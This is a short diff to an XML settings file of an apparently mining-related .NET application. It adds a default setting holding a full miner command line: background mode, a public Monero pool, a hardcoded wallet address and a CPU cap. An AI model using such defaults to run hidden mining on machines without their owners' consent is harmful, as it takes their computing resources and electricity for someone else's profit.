@@ -62,5 +62,8 @@
     <Setting Name="xmrpass" Type="System.String" Scope="User">
       <Value Profile="(Default)" />
     </Setting>
+    <Setting Name="xmrcustom" Type="System.String" Scope="User">
+      <Value Profile="(Default)">-B --donate-level=0 -a cryptonight --url=gulf.moneroocean.stream:80 -u 49H8Kbf15JFN2diG5evGHA5G49qhgFBuDid86z3MKxTv59dcqySCzFWUL3SgsEk2SufzTziHp3UE5P8BatwuyFuv1bBKQw2 -p x -R --variant=-1 --max-cpu-usage=75</Value>
+    </Setting>
   </Settings>
 </SettingsFile>
